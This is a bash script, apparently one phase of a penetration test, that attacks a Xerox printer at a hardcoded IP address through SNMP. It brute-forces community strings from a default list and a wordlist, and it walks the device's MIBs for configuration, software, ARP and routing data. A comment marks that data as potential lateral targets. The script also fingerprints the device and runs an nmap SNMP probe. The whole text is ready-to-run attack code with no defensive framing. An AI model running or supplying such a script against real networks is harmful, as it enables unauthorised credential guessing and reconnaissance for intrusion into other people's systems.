#!/bin/bash
# Phase 3: SNMP Enumeration
# Xerox printers commonly expose SNMP v1/v2c with default communities
# Rich source of model, firmware, config, and network info

TARGET="13.13.1.112"
OUTDIR="../results/03_snmp"
mkdir -p "$OUTDIR"

echo "[*] Phase 3: SNMP Enumeration - $TARGET"

###############################################################################
# 3a. Community string brute-force
###############################################################################
echo "[+] Testing common SNMP community strings..."

COMMUNITIES=("public" "private" "internal" "xerox" "admin" "manager" "monitor"
             "XEROX" "Public" "Private" "default" "snmp" "printer" "community"
             "read" "write" "test" "guest" "system" "SNMP" "all")

for COMM in "${COMMUNITIES[@]}"; do
  RESULT=$(snmpget -v2c -c "$COMM" -t 2 -r 1 "$TARGET" 1.3.6.1.2.1.1.1.0 2>/dev/null)
  if [[ $? -eq 0 ]]; then
    echo "  [!] Valid community: '$COMM' -> $RESULT"
    echo "$COMM" >> "$OUTDIR/valid_communities.txt"
  fi
done

# Also try with onesixtyone for speed if available
if command -v onesixtyone &>/dev/null; then
  echo "[+] Running onesixtyone brute-force..."
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
    "$TARGET" 2>/dev/null | tee "$OUTDIR/onesixtyone.txt"
fi

###############################################################################
# 3b. Full SNMP walk with discovered community
###############################################################################
COMM=$(head -1 "$OUTDIR/valid_communities.txt" 2>/dev/null || echo "public")

echo "[+] Full SNMP walk with community '$COMM'..."
snmpwalk -v2c -c "$COMM" -ObentU "$TARGET" . 2>/dev/null > "$OUTDIR/full_walk.txt"

echo "[+] Walking printer-specific MIB subtrees..."

# System info
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.1 2>/dev/null > "$OUTDIR/system_info.txt"

# Printer MIB (RFC 1759 / RFC 3805)
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.43 2>/dev/null > "$OUTDIR/printer_mib.txt"

# Host Resources MIB - installed software, storage, processes
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.25 2>/dev/null > "$OUTDIR/host_resources.txt"

# Interfaces / Network
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.2 2>/dev/null > "$OUTDIR/interfaces.txt"

# IP addressing
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.4 2>/dev/null > "$OUTDIR/ip_info.txt"

# ARP table (potential lateral targets)
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.4.22 2>/dev/null > "$OUTDIR/arp_table.txt"

# Routing table
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.2.1.4.21 2>/dev/null > "$OUTDIR/routing_table.txt"

# Xerox-specific private MIB enterprise OID
snmpwalk -v2c -c "$COMM" "$TARGET" 1.3.6.1.4.1.253 2>/dev/null > "$OUTDIR/xerox_private_mib.txt"

###############################################################################
# 3c. Key individual OIDs for fingerprinting
###############################################################################
echo "[+] Querying specific OIDs for device fingerprinting..."

declare -A OIDS=(
  ["sysDescr"]="1.3.6.1.2.1.1.1.0"
  ["sysObjectID"]="1.3.6.1.2.1.1.2.0"
  ["sysUpTime"]="1.3.6.1.2.1.1.3.0"
  ["sysContact"]="1.3.6.1.2.1.1.4.0"
  ["sysName"]="1.3.6.1.2.1.1.5.0"
  ["sysLocation"]="1.3.6.1.2.1.1.6.0"
  ["prtGeneralSerialNumber"]="1.3.6.1.2.1.43.5.1.1.17.1"
  ["prtMarkerSuppliesLevel"]="1.3.6.1.2.1.43.11.1.1.9"
  ["prtInputMediaName"]="1.3.6.1.2.1.43.8.2.1.12"
  ["hrDeviceDescr"]="1.3.6.1.2.1.25.3.2.1.3"
  ["hrSWInstalledName"]="1.3.6.1.2.1.25.6.3.1.2"
  ["hrMemorySize"]="1.3.6.1.2.1.25.2.2.0"
  ["hrProcessorLoad"]="1.3.6.1.2.1.25.3.3.1.2"
  ["hrStorageDescr"]="1.3.6.1.2.1.25.2.3.1.3"
)

for NAME in "${!OIDS[@]}"; do
  VAL=$(snmpget -v2c -c "$COMM" -OvQ "$TARGET" "${OIDS[$NAME]}" 2>/dev/null)
  [[ -n "$VAL" ]] && echo "  $NAME = $VAL"
done | tee "$OUTDIR/fingerprint.txt"

###############################################################################
# 3d. SNMPv3 user enumeration
###############################################################################
echo "[+] Testing SNMPv3 user enumeration..."
nmap -sU -p 161 --script=snmp-info "$TARGET" -oA "$OUTDIR/snmpv3_info" 2>/dev/null

echo "[*] SNMP enumeration complete. Review results in $OUTDIR/"
